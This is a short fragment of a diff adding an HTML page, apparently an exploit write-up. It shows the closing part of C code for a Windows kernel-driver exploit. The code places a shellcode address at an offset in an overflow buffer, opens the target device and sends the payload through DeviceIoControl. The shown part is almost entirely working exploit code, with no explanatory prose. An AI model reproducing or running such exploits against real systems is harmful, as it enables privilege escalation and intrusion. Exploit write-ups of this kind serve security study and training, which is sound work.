+    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01\x01\x01\x01\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// Shellcode address
+</span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+
+    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_HI</span><span class="p">,</span> <span class="n">magik</span><span class="p">,</span> <span class="n">lenMagik</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+			</div>
+		</div>
+
+    </div>
+
+</body>
+</html>
